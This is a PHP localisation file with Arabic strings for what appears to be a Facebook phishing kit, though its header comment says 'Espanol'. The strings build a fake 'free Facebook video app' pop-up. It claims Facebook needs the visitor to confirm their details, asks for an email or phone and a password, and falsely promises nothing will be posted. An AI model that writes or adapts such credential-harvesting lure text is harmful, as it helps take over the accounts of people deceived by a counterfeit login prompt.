<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'ar';
 
// Fondo

$lang['TITULO_PAGINA'] = 'تطبيق الفيسبوك';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'الفيسبوك تطبيق الفيديو (مجانا )';
$lang['POPUP_DESCRIPCION'] = 'لفيسبوك يحتاج لتأكيد المعلومات التالية للسماح بالوصول إلى هذا التطبيق أشرطة الفيديو، تسجيل الدخول!';
$lang['POPUP_CORREO'] = 'بريد الكتروني او هاتف';
$lang['POPUP_CONTRASENA'] = 'كلمه السر';
$lang['POPUP_SUBMIT'] = 'تسجيل الدخول';
$lang['POPUP_CANDADO'] = 'لا يسمح هذا التطبيق لنشر في الفيسبوك.';